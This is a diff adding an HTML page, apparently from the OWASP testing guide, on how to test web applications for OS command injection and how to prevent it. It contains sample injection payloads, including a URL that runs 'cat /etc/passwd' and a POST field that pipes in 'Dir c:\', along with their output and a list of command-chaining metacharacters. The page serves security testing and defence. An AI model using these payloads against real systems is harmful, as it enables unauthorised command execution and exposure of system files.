@@ -1,0 +1,198 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Command Injection</title>
+</head><body><b>Summary</b><br/>
+<br/>
+This article describes how to test an application for OS command injection. The tester will try to inject an OS command through an HTTP request to the application.<br/>
+<br/>
+<br/>
+OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.<br/>
+<br/>
+<br/>
+<b>How to Test</b><br/>
+<br/>
+When viewing a file in a web application, the file name is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol “|” onto the end of the file name.<br/>
+<br/>
+<br/>
+Example URL before alteration:<br/>
+http://sensitive/cgi-bin/userData.pl?doc=user1.txt<br/>
+<br/>
+<br/>
+Example URL modified:<br/>
+http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|<br/>
+<br/>
+<br/>
+This will execute the command “/bin/ls”.<br/>
+<br/>
+Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. %3B is url encoded and decodes to semicolon<br/>
+<br/>
+<b>Example</b>:<br/>
+<br/>
+http://sensitive/something.php?dir=%3Bcat%20/etc/passwd<br/>
+<br/>
+<br/>
+<b>Example</b><br/>
+Consider the case of an application that contains a set of documents that you can browse from the Internet. If you fire up WebScarab, you can obtain a POST HTTP like the following:<br/>
+<br/>
+POST http://www.example.com/public/doc HTTP/1.1<br/>
+Host: www.example.com<br/>
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20061010 FireFox/2.0<br/>
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5<br/>
+Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3<br/>
+Accept-Encoding: gzip,deflate<br/>
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br/>
+Keep-Alive: 300<br/>
+Proxy-Connection: keep-alive<br/>
+Referer: http://127.0.0.1/WebGoat/attack?Screen=20<br/>
+Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5<br/>
+Authorization: Basic T2Vbc1Q9Z3V2Tc3e=<br/>
+Content-Type: application/x-www-form-urlencoded<br/>
+Content-length: 33<br/>
+<br/>
+Doc=Doc1.pdf<br/>
+<br/>
+<br/>
+In this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following:<br/>
+<br/>
+POST http://www.example.com/public/doc HTTP/1.1<br/>
+Host: www.example.com<br/>
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20061010 FireFox/2.0<br/>
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5<br/>
+Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3<br/>
+Accept-Encoding: gzip,deflate<br/>
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br/>
+Keep-Alive: 300<br/>
+Proxy-Connection: keep-alive<br/>
+Referer: http://127.0.0.1/WebGoat/attack?Screen=20<br/>
+Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5<br/>
+Authorization: Basic T2Vbc1Q9Z3V2Tc3e=<br/>
+Content-Type: application/x-www-form-urlencoded<br/>
+Content-length: 33<br/>
+<br/>
+Doc=Doc1.pdf+|+Dir c:\<br/>
+<br/>
+<br/>
+If the application doesn't validate the request, we can obtain the following result:<br/>
+<br/>
+Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'<br/>
+Output...<br/>
+Il volume nell'unità C non ha etichetta.<br/>
+Numero di serie Del volume: 8E3F-4B61<br/>
+Directory of c:\<br/>
+&nbsp;18/10/2006 00:27 2,675 Dir_Prog.txt<br/>
+&nbsp;18/10/2006 00:28 3,887 Dir_ProgFile.txt<br/>
+&nbsp;16/11/2006 10:43<br/>
+&nbsp; &nbsp; Doc<br/>
+&nbsp; &nbsp; 11/11/2006 17:25<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;Documents and Settings<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;25/10/2006 03:11<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; I386<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 14/11/2006 18:51<br/>
+&#09; &nbsp; &nbsp; h4ck3r<br/>
+&#09; &nbsp; &nbsp; 30/09/2005 21:40 25,934 <br/>
+&#09;&#09;OWASP1.JPG<br/>
+&#09;&#09;03/11/2006 18:29<br/>
+&#09;&#09;&#09;Prog<br/>
+&#09;&#09;&#09;18/11/2006 11:20<br/>
+&#09;&#09;&#09;&#09;Program Files<br/>
+&#09;&#09;&#09;&#09;16/11/2006 21:12<br/>
+&#09;&#09;&#09;&#09;&#09;Software<br/>
+&#09;&#09;&#09;&#09;&#09;24/10/2006 18:25<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;Setup<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;24/10/2006 23:37<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;&#09;Technologies<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;&#09;18/11/2006 11:14&#09;<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;&#09;3 File 32,496 byte<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;&#09;13 Directory 6,921,269,248 byte disponibili<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;&#09;Return code: 0<br/>
+<br/>
+<br/>
+In this case, we have successfully performed an OS injection attack. <br/>
+<br/>
+<b>Special Characters for Comand Injection </b><br/>
+The following special character can be used for command injection such as |  ; &amp; $ &gt; &lt; ` \ ! <br/>
+&nbsp;<ul><li>&nbsp;cmd1|cmd2  : Uses of | will make command 2 to be executed weather command 1 execution is successful or not.</li>
+<li>&nbsp;cmd1;cmd2  : Uses of ; will make command 2 to be executed weather command 1 execution is successful or not.</li>
+<li>&nbsp;cmd1||cmd2  : Command 2 will only be executed if command 1 execution fails.</li>
+<li>&nbsp;cmd1&amp;&amp;cmd2 : Command 2 will only be executed if command 1 execution succeeds.</li>
+<li>&nbsp;$(cmd) : For example, echo $(whoami) or $(touch test.sh; echo 'ls' &gt; test.sh)</li>
+<li>&nbsp;'cmd' : It's used to execute specific command. For example, 'whoami'</li>
+<li>&nbsp;&gt;(cmd): &lt;(ls)</li>
+<li>&nbsp;&lt;(cmd): &gt;(ls)</li>
+</ul>
+<br/>
+<b>Code Review Dangerous API </b><br/>
+Be aware of the uses of the following API as it may introduce the command injection risks. <br/>
+Java <br/>
+&nbsp;<ul><li>&nbsp;Runtime.exec()</li>
+<li>&nbsp;getParameter</li>
+<li>&nbsp;getRuntime.exec()</li>
+<li>&nbsp;ProcessBuilder.start()</li>
+<li>&nbsp;setAttribute putValue getValue </li>
+<li>&nbsp;java.net.Socket java.io.fileInputStream java.io.FileReader</li>
+</ul>
+<br/>
+C/C++ <br/>
+&nbsp;<ul><li>&nbsp;system</li>
+<li>&nbsp;exec</li>
+<li>&nbsp;ShellExecute</li>
+<li>&nbsp;execlp</li>
+</ul>
+<br/>
+Python <br/>
+&nbsp;<ul><li>&nbsp;exec</li>
+<li>&nbsp;eval</li>
+<li>&nbsp;os.system</li>
+<li>&nbsp;os.popen</li>
+<li>&nbsp;subprocess.popen</li>
+<li>&nbsp;subprocess.call</li>
+</ul>
+<br/>
+PHP <br/>
+&nbsp;<ul><li>&nbsp;system</li>
+<li>&nbsp;shell_exec</li>
+<li>&nbsp;exec</li>
+<li>&nbsp;proc_open</li>
+<li>&nbsp;eval</li>
+<li>&nbsp;passthru</li>
+<li>&nbsp;proc_open</li>
+<li>&nbsp;expect_open</li>
+<li>&nbsp;ssh2_exec</li>
+<li>&nbsp;popen</li>
+</ul>
+<br/>
+Perl <br/>
+&nbsp;<ul><li>&nbsp;CGI.pm</li>
+<li>&nbsp;referer</li>
+<li>&nbsp;cookie</li>
+<li>&nbsp;ReadParse</li>
+</ul>
+<br/>
+ASP.NET <br/>
+&nbsp;<ul><li>&nbsp;HttpRequest.Params</li>
+<li>&nbsp;HttpRequest.Url</li>
+<li>&nbsp;HttpRequest.Item</li>
+</ul>
+<b><br/>
+Remediation <br/>
+</b><b>Sanitization </b><br/>
+The URL and form data needs to be sanitized for invalid characters. A “blacklist” of characters is an option but it may be difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet. A “white list” containing only allowable characters or command list should be created to validate the user input. Characters that were missed, as well as undiscovered threats, should be eliminated by this list. <br/>
+Genereal blacklist to be included for commannd injection can be |  ; &amp; $ &gt; &lt; ' \  ! &gt;&gt; # <br/>
+Escape or filter special characters for windows,   ( ) &lt; &gt; &amp; * ‘ | = ? ; [ ] ^ ~ ! . ” % @ / \ : + , ` <br/>
+Escape or filter special characters for Linux, { }  ( ) &lt; &gt; &amp; * ‘ | = ? ; [ ]  $ – # ~ ! . ” %  / \ : + , ` <br/>
+&nbsp;<br/>
+<br/>
+<b>Permissions</b>&nbsp;<br/>
+The web application and its components should be running under strict permissions that do not allow operating system command execution. Try to verify all these informations to test from a Gray Box point of view <br/>
+&nbsp;Tools <ul><li>&nbsp;OWASP <a href="https://www.owasp.org/index.php/OWASP_WebScarab_Project">WebScarab</a>&nbsp;</li>
+<li>&nbsp;OWASP <a href="https://www.owasp.org/index.php/OWASP_WebGoat_Project">WebGoat</a>&nbsp;</li>
+<li>&nbsp;<a href="https://github.com/commixproject/commix">Commix</a></li>
+</ul>
+References <ul><li>&nbsp;<a href="http://www.securityfocus.com/infocus/1709">http://www.securityfocus.com/infocus/1709</a></li>
+<li>&nbsp;<a href="http://projects.webappsec.org/w/page/13246950/OS%20Commanding">http://projects.webappsec.org/w/page/13246950/OS%20Commanding</a></li>
+<li>&nbsp;<a href="https://cwe.mitre.org/data/definitions/78.html">https://cwe.mitre.org/data/definitions/78.html</a></li>
+<li>&nbsp;<a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=2130132">https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=2130132</a></li>
+</ul>
+&nbsp;</body></html>
